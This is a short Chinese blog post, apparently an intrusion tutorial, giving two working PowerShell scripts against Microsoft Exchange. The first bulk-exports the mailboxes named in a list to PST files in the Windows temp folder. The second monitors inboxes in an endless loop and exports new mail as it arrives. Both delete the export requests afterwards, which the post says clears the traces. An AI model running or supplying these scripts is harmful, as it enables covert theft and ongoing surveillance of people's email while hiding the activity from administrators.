---
layout:     post
title:      "Exchange邮箱导出"
subtitle:   "Exchange邮箱导出"
date:       2023-01-29 12:00:00
author:     "cainiao3389"
header-img: "img/post-bg-desk.jpg"
catalog: true
tags:
    - 内网
---

## 利用PSSession（exchange本地使用）

#### 1.批量导出指定时间邮箱的Powershell代码
```PowerShell
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://**exchange服务器域名**/PowerShell/ -Authentication Kerberos
$mailboxList = Get-Content "mail.txt" //存放邮件的txt文件

Import-PSSession $session

foreach ($mailboxName in $mailboxList) {
    //设置导出邮件位置可自定义
	$exportFilePath = "\\localhost\c$\windows\temp\$($mailboxName).pst"
    
    //导出邮件(Received -gt '01/01/2023') -or (Sent -gt '01/01/2023')这个意思是导出2023年1月1号的收件箱和发件箱邮箱 可自定义修改
    $a = New-MailboxExportRequest -Mailbox $mailboxName -FilePath $exportFilePath -ContentFilter "(Received -gt '01/01/2023') -or (Sent -gt '01/01/2023')"

    //等待6秒
	Start-Sleep -Seconds 6
	
    //会自动清除导出痕迹内容
	$exportRequests = Get-MailboxExportRequest | Where-Object { $_.Mailbox -eq $a.Mailbox }
	$exportRequests | Remove-MailboxExportRequest -Confirm:$false
	
}

Remove-PSSession $session
```

**mail.txt内容：**
```txt
asdfasdf@test.com
asdfasdf1@test.com
asdfasdf2@test.com
asdfasdf3@test.com
```
**会在c:\windows\temp\的地方导出邮件**

--- 

#### 2.实时监控邮件Powershell代码

```PowerShell
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://**exchange服务器域名**/PowerShell/ -Authentication Kerberos
$mailboxList = Get-Content "c:\windows\temp\mail.txt"
$mailSizeArray = @()
$exi = 0

Import-PSSession $Session
foreach ($mailboxName in $mailboxList) {
	$newEmails01 = Get-MailboxFolderStatistics -Identity $mailboxName -FolderScope Inbox
	$mailSizeArray += $newEmails01.FolderSize
}

while ($true) {
	$x = 0
	foreach ($mailboxName in $mailboxList) {
		$newEmails = Get-MailboxFolderStatistics -Identity $mailboxName -FolderScope Inbox
		$getMailCount = $newEmails.FolderSize
		
		if ($getMailCount -ne $mailSizeArray[$x]) {
			$mailSizeArray[$x] = $getMailCount
			
			$exportFilePath = "\\localhost\c$\windows\temp\$($mailboxName)$($exi).pst"
			$exi = $exi + 1
			
            $mailGetRes = New-MailboxExportRequest -Mailbox $mailboxName -FilePath $exportFilePath -ContentFilter "(Received -gt '01/01/2023') -or (Sent -gt '01/01/2023')"

            Start-Sleep -Seconds 10
			
            $exportRequests = Get-MailboxExportRequest | Where-Object { $_.Mailbox -eq $mailGetRes.Mailbox }
            
            $exportRequests | Remove-MailboxExportRequest -Confirm:$false
            
		}
		$x = $x + 1
	}
	Start-Sleep -Seconds 30
}
Remove-PSSession $Session
```






